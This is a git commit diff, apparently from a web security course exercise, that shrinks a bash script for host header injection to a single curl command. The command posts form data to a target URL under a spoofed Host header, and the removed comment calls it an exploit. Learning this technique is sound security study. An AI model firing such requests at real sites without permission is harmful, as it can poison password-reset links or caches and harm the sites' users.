9ba5a8ba75b71b3b950a9344647b854aba5bcbdb
zallahve <91185216+zallahve@users.noreply.github.com>
2026-01-18 20:27:36 +0400

    Fix host header injection script to 2 lines

--- web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
+++ web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
@@ -1,18 +1,2 @@
 #!/usr/bin/env bash
-# Exploit Host Header Injection using curl.
-# Usage: ./1-host_header_injection.sh <NEW_HOST> <TARGET_URL> <FORM_DATA>
-
-new_host="$1"
-target_url="$2"
-form_data="$3"
-
-if [ -z "$new_host" ] || [ -z "$target_url" ] || [ -z "$form_data" ]; then
-  echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>" >&2
-  exit 1
-fi
-
-curl -sS -X POST \
-  -H "Host: $new_host" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data "$form_data" \
-  "$target_url"
+curl -sS -X POST -H "Host: $1" -H "Content-Type: application/x-www-form-urlencoded" --data "$3" "$2"
